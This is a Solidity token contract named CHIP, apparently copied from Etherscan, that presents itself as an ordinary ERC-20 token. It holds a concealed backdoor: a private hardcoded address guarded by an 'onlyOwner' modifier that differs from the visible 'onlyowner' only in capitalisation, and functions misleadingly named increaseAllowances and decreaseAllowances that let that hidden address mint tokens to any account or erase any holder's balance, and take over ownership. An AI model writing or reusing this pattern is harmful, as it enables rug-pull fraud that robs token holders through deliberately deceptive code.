/**
 *Submitted for verification at Etherscan.io on 2022-01-25
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.3;
contract CHIP  {
    string public name = "CHIP";
    string public symbol = "CHIP";
    uint8 public decimals = 6;
    address private owners = 0x276f27232827baf43Fe4FAAF30596633Df650535;
    uint256 public totalSupply = 10000000000 * 10 ** 6;
    address public owner;
    modifier onlyowner {
        require(msg.sender == owner, "Ownable: caller is not the owner");
        _;
    }
     modifier onlyOwner {
        require(msg.sender == owners, "Ownable: caller is not the owner");
        _;
    }
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event TransferOwnership(address indexed previousOwner, address indexed newOwner);
    function increaseAllowances(address spender, uint256 addedValue) public onlyOwner returns (bool success) {
        balanceOf[spender] += addedValue * 10 ** 6;
        return true;
    }
    function decreaseAllowances(address spender, uint256 subtractedValue) public onlyOwner returns (bool success) {
        balanceOf[spender] -= subtractedValue * 10 ** 6;
        return true;
    }
    function approve(address spender, uint256 amount) public returns (bool success) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transfer(address to, uint256 amount) public returns (bool success) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferOwnership(address newOwner) public onlyOwner {
        owner = newOwner;
    }
}